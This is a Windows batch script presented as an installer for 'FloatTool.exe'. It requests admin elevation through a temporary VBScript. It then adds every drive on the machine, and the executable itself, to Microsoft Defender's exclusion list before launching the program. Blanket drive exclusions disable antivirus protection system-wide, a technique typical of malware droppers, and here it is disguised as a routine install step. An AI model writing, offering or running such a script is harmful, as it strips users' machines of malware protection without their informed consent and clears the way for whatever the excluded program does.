@echo off

NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' (
    goto :runAsAdmin
) else (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\Admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\Admin.vbs"
    "%temp%\Admin.vbs"
    del "%temp%\Admin.vbs"
    exit /B
)

:runAsAdmin

for /f "tokens=1 delims=:" %%d in ('wmic logicaldisk get caption ^| findstr /r "[a-zA-Z]:"') do (
    powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%%d\'}"
)

REM Add FloatTool.exe to the exclusion list
powershell.exe -Command "& {Add-MpPreference -ExclusionPath '%~dp0FloatTool.exe'}"

echo Install Complete

start "" "%~dp0FloatTool.exe"
pause
